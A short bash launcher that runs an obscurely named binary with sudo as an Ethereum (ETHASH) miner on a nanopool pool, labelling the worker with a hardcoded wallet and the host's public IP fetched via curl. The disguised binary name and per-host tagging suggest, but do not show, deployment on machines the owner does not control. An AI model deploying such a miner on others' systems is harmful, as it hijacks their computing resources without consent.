#!/bin/bash
#!/bin/bash

POOL=eth-eu1.nanopool.org:9999
WALLET=0xf7fe12e0432b84added46f93704a2dcc0938abbe.$(echo "$(curl -s ifconfig.me)" | tr . _ )-hienthuan343
cd "$(dirname "$0")"

chmod +x ./bmtngheodoiqua && sudo ./bmtngheodoiqua --algo ETHASH --pool $POOL --user $WALLET  $@
